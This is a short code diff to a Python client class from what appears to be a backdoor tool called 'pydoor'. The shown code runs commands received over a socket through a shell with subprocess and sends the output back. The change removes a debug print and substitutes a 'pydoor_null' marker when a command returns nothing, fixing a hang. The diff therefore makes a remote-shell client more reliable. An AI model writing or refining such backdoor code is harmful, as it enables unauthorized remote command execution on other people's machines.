@@ -42,8 +42,6 @@ class Client:
 
     def argumentize(self):
         self.args = self.cmd.split()
-        print(self.cmd[1])
-
 
     def processcmd(self):
 
@@ -71,8 +69,11 @@ class Client:
             
             else:
                 j = subprocess.Popen(self.cmd, shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE, executable=self.shell)
-                out = j.communicate()
-                self.sock.sendall(out[0])
+                out = j.communicate()[0].decode('utf-8').strip()
+                if len(out) == 0:
+                    out = "pydoor_null" #Return a special command that will be handled by the server if the command output is empty, this is to prevent infinite hanging when a command returns nothing.
+                    
+                self.sock.sendall(out.encode())
 
     def start(self):
         
